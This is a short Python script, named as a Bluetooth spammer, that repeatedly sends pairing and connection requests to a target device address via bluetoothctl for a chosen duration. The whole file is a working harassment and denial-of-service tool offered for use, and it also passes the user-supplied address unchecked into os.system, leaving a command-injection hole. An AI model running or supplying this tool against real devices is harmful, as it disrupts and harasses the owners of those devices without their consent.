import bluetooth
import sys
import time
import os

if len(sys.argv) < 3:
    print("Usage: python3 bluetooth_spammer.py <device> <time>")
    sys.exit()

device_address = sys.argv[1]
spam_duration = int(sys.argv[2])

start_time = time.time()

while time.time() - start_time < spam_duration:
    try:
        print(f"Sending pairing request to {device_address}...")
        os.system(f"bluetoothctl pair {device_address}")
        os.system(f"bluetoothctl connect {device_address}")
    except Exception as e:
        print("Error:", e)
    time.sleep(2)

print("Spamming completed!")
